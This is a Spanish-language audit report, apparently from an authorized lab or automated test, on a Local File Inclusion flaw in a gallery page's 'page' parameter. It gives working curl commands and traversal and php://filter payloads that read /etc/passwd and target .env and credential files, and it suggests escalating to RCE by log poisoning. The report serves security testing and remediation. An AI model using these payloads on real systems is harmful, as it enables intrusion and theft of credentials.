# Informe de auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T13:53:00Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en la web objetivo. Se logró leer archivos del sistema (por ejemplo, /etc/passwd). Impacto: divulgación de información del sistema y potencial escalada mediante técnicas adicionales (por ejemplo, lectura de /proc/self/environ, archivos de configuración, o llaves privadas si existen y permisos lo permiten).

Vector y punto vulnerable
-------------------------
- URL y parámetro vulnerable: /gallery.php?page (parámetro "page").
- Comportamiento: la aplicación incluye archivos basándose directamente en el valor de "page" sin sanitización o validación adecuada.

Comandos exactos ejecutados (registro)
--------------------------------------
Se emplearon comandos curl y cadenas de fuzzing simples. Extracto de los comandos clave usados durante el análisis:

1) Recon/primeros tests de parámetros:
- mkdir -p /tmp/lfi_tests && curl -s -D /tmp/lfi_tests/headers.txt 'http://web.dev.local:8081/' -o /tmp/lfi_tests/home.html
- for p in '?page=/etc/passwd' '?file=/etc/passwd' '?inc=/etc/passwd' '?lang=/etc/passwd' '/?page=../../../../../../etc/passwd' '/?file=../../../../../../etc/passwd' '/index.php?page=../../../../../../etc/passwd' '/download.php?file=../../../../../../etc/passwd' '/view.php?template=../../../../../../etc/passwd' ; do curl -s 'http://web.dev.local:8081'$p; done

2) Prueba con php://filter y fuzz contra gallery.php:
- URL base: "http://web.dev.local:8081/gallery.php?page="
- Payloads probados (ejemplos):
  - php://filter/read=convert.base64-encode/resource=/etc/passwd
  - php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
  - ../../../../../../etc/passwd
  - /etc/passwd
  - ../../../../../../proc/self/environ
  - php://filter/read=convert.base64-encode/resource=/var/www/html/.env
  - ../../../../../../var/www/html/.env
  - ../../../../../../.git/config

Payloads que confirmaron la vulnerabilidad
------------------------------------------
Se obtuvieron respuestas que contienen el contenido de /etc/passwd. Payloads exitosos:

- http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd
  Resultado: contenido de /etc/passwd mostrado en la respuesta HTML (listado de usuarios del sistema, p. ej. "root:x:0:0:root:/root:/bin/bash").

- http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
  Resultado: el servidor devolvió una sección base64 con el contenido codificado de /etc/passwd; al decodificarla se recuperó el mismo listado.

Evidencia (fragmentos relevantes)
---------------------------------
- Contenido recuperado (ejemplo):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Intentos adicionales de explotación
-----------------------------------
- Se intentó leer otros ficheros sensibles con php://filter y traversal (por ejemplo, /var/www/html/.env, .git/config, /proc/self/environ). No todos devolvieron datos sensibles en esta sesión; sin embargo, la presencia de LFI facilita intentos adicionales como log poisoning, lectura de /proc/self/environ para extraer variables de entorno, o ataques a archivos de backup.

Impacto
-------
- Confidencialidad: divulgación de información de sistema (usuarios del sistema), posible descubrimiento de ficheros de aplicación y credenciales si existen en ficheros accesibles.
- Integridad/Disponibilidad: LFI combinado con otras condiciones puede conducir a RCE (ej. log poisoning + inclusion de logs) o permitir acceso a llaves privadas si el proceso PHP puede leerlas (id_rsa), posibilitando movimientos laterales.

Estado final de la auditoría
---------------------------
- VULN_FOUND: true  (se confirmó LFI y se leyeron ficheros del sistema)
- VULN_EXPLOITED: true  (se leyó con éxito /etc/passwd, cumplimiento del criterio de explotación)

Recomendaciones
---------------
1. Evitar incluir archivos basándose en entradas del usuario. Implementar una lista blanca (whitelist) de plantillas/recursos permitidos.
2. Usar realpath() y validar que el archivo a incluir resida dentro del directorio permitido.
3. Deshabilitar wrappers peligrosos si no son necesarios (p. ej. deshabilitar allow_url_include si está activo). Bloquear php:// wrappers según la necesidad.
4. Aplicar open_basedir para restringir rutas accesibles por PHP.
5. Minimizar privilegios del usuario que ejecuta el servidor web y proteger ficheros sensibles (chmod 640/600) y ubicarlos fuera del directorio público.
6. Revisar logs y buscar signos de explotación adicional.

Comandos y payloads reproducibles (resumen)
-------------------------------------------
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd' | sed -n '1,200p' # decodificar con base64 -d

Notas finales
-------------
El análisis se realizó en un entorno de laboratorio autorizado. Si se desea, se pueden continuar los pasos de explotación para intentar RCE (log poisoning, incluir /proc/self/environ, o intentar lectura de /etc/shadow si los permisos lo permiten). Estos pasos requieren precauciones adicionales y elevarían el impacto real del test.

Informe generado por: herramienta automatizada + auditor manual
